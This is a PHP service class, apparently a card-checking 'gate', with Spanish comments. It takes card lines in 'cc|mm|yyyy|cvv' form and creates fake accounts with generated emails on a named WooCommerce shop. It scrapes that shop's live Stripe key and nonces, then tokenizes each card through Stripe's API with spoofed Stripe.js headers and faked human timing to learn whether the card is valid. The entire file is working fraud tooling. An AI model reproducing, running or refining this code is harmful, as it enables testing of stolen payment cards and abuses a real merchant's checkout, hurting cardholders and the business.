<?php

namespace App\Services;

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use Illuminate\Support\Str;
use Faker\Factory as Faker;

class gate1stripe
{
    protected $client;
    protected $jar;

    public function __construct()
    {
        $this->jar = new CookieJar();
        $this->client = new Client([
            'cookies' => $this->jar,
            'verify' => false,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            ]
        ]);
    }

    public function testFromConsole(string $ccLine)
    {
        $faker = Faker::create();
        $email = $faker->safeEmail();
        
        echo "--- INICIANDO TEST PARA: $ccLine ---\n";
        echo "Email generado: $email\n";

        $data = explode('|', $ccLine);
        if (count($data) < 4) return "Error: Formato cc|mm|yyyy|cvv incorrecto.\n";
        [$num, $mes, $anio, $cvv] = $data;

        try {
            // 1. Registro y Nonce
            echo "[1/5] Obteniendo Nonce...\n";
            $r1 = $this->client->get('https://www.epicswordscheckout.com/my-account/?action=register');
            preg_match('/name="_wpnonce" value="([^"]+)"/', (string)$r1->getBody(), $m);
            $nonce = $m[1] ?? null;
            if (!$nonce) return "Fallo: No se encontró nonce de registro.\n";

            // 2. Registro
            echo "[2/5] Registrando cuenta...\n";
            $this->client->post('https://www.epicswordscheckout.com/my-account/', [
                'form_params' => [
                    'email' => $email,
                    '_wpnonce' => $nonce,
                    'register' => 'Register'
                ]
            ]);

            // 3. Config Stripe
            echo "[3/5] Obteniendo llaves de Stripe...\n";
            $r3 = $this->client->get('https://www.epicswordscheckout.com/my-account/add-payment-method/');
            $html = (string)$r3->getBody();
            preg_match('/"key":"(pk_live_[^"]+)"/', $html, $k);
            preg_match('/"add_card_nonce":"([^"]+)"/', $html, $an);
            
            $pk = $k[1] ?? null;
            $addNonce = $an[1] ?? null;
            if (!$pk) return "Fallo: No se encontró Stripe PK.\n";

            // 4. Tokenización (CORREGIDO PARA EVITAR ERROR 400)
            echo "[4/5] Tokenizando en Stripe...\n";
            
            // Stripe requiere estos headers para validar la integración
            $stripeHeaders = [
                'Accept' => 'application/json',
                'Content-Type' => 'application/x-www-form-urlencoded',
                'Origin' => 'https://js.stripe.com',
                'Referer' => 'https://js.stripe.com/',
                'X-Stripe-Client-User-Agent' => json_encode([
                    'full_name' => 'Stripe.js',
                    'version' => '805cc890ee',
                    'url' => 'https://stripe.com/docs/js',
                ]),
            ];

            $r4 = $this->client->post('https://api.stripe.com/v1/payment_methods', [
                'headers' => $stripeHeaders,
                'form_params' => [
                    'type' => 'card',
                    'card[number]' => $num,
                    'card[cvc]' => $cvv,
                    'card[exp_month]' => $mes,
                    'card[exp_year]' => substr($anio, -2),
                    'key' => $pk,
                    'guid' => Str::uuid(),
                    'muid' => Str::uuid(),
                    'sid' => Str::uuid(),
                    'payment_user_agent' => 'stripe.js/805cc890ee; stripe-js-v3/805cc890ee; split-card-element',
                    'time_on_page' => rand(12000, 25000), // Simula tiempo humano
                ]
            ]);

            $stripeData = json_decode($r4->getBody(), true);
            $pm = $stripeData['id'] ?? null;
            if (!$pm) return "Fallo: Stripe no devolvió PM ID.\n";

            // 5. Final (Setup Intent)
            echo "[5/5] Vinculando (Setup Intent)...\n";
            $r5 = $this->client->post('https://www.epicswordscheckout.com/?wc-ajax=wc_stripe_create_setup_intent', [
                'headers' => [
                    'X-Requested-With' => 'XMLHttpRequest',
                    'Referer' => 'https://www.epicswordscheckout.com/my-account/add-payment-method/',
                ],
                'form_params' => [
                    'stripe_source_id' => $pm,
                    'nonce' => $addNonce
                ]
            ]);

            return "\n--- RESPUESTA FINAL ---\n" . $r5->getBody() . "\n";

        } catch (\GuzzleHttp\Exception\ClientException $e) {
            // Captura el error específico de la respuesta para debug
            $responseBody = $e->getResponse()->getBody()->getContents();
            return "ERROR DE CLIENTE: " . $responseBody . "\n";
        } catch (\Exception $e) {
            return "ERROR CRÍTICO: " . $e->getMessage() . "\n";
        }
    }
}

